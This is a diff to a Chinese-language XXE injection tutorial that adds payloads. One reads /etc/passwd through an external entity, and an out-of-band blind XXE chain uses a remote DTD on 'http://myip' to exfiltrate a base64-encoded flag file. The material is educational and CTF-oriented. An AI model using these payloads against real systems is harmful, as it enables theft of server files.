@@ -13,12 +13,18 @@ XXE(XML External Entity),即是XML外部实体注入攻击.漏洞是在对不安
 <!ELEMENT msg (#PCDATA)>
 ```
 DTD(The document type definition)，即是文档类型定义，可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。   
-前提条件：允许外部实体引用。   
+```
+<!ENTITY 实体名 SYSTEM url > //外部实体
+<!ENTITY 实体名 实体的值 > //内部实体
+```
+
+```
 入门：  
 - [一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)    
 - [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)
 ![](https://raw.githubusercontent.com/ReAbout/web-exp/master/images/xxe-injection.svg?sanitize=true)
 ## XXE漏洞利用
+前提条件：允许外部实体引用。   
 按服务端语言有PHP、JAVA、JAVA(Android)一般解析函数都是默认不开启的、Python、libxml。   
 漏洞利用方法分：   
 - 回显读取文件   
@@ -32,12 +38,49 @@ DTD(The document type definition)，即是文档类型定义，可定义合法�
 
 <!DOCTYPE XXE [
 <!ELEMENT name ANY >
-<!ENTITY XXE SYSTEM "file://etc/passwd" >]>
+<!ENTITY XXE SYSTEM "file:///etc/passwd" >]>
 
 <root>
   <name>&XXE;</name>
 </root>
 ```
+### 0x01回显读取文件
+### 0x02不带回显读取文件-OOB(Out of Band） 
+OOB XXE 需要使用到DTD约束自定义实体中的参数实体。参数实体是只能在DTD中定义和使用的实体，以 %为标志定义，定义和使用方法如下    
+```
+<?xml version="1.0"?>
+<!DOCTYPE message [
+    <!ENTITY normal "hello">  <!-- 内部普通实体 -->
+    <!ENTITY normal SYSTEM "http://xml.org/hhh.dtd">  <!-- 外部普通实体 -->
+    <!ENTITY % para SYSTEM "file:///1234.dtd">  <!-- 外部参数实体 -->
+    %para;            <!-- 引用参数实体 -->
+]>
+而且参数实体还能嵌套定义，但需要注意的是，内层的定义的参数实体% 需要进行HTML转义，否则会出现解析错误。   
+```
+<?xml version="1.0"?>
+<!DOCTYPE test [
+    <!ENTITY % outside '<!ENTITY &#x25; files SYSTEM "file:///etc/passwd">'>
+]>
+```
+>禁止调用同级实体，无法直接读取文件数据通过http回传我们的服务器，所以要用外部实体才能读取数据。   
+my.dtd
+```
+<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://myip/?%file;'>">
+%start;
+Payload：   
+```
+注入的内容：   
+```
+<?xml version="1.0"?>
+<!DOCTYPE message [
+    <!ENTITY % remote SYSTEM "http://myip/my.dtd">  //调用我们的dtd
+    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
+    %remote;
+    %send;
+]>
+```
+
 ### Reference
 
 [Exploiting XXE with local DTD files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)   
+[Blind XXE详解与Google CTF一道题分析](https://www.freebuf.com/vuls/207639.html)  
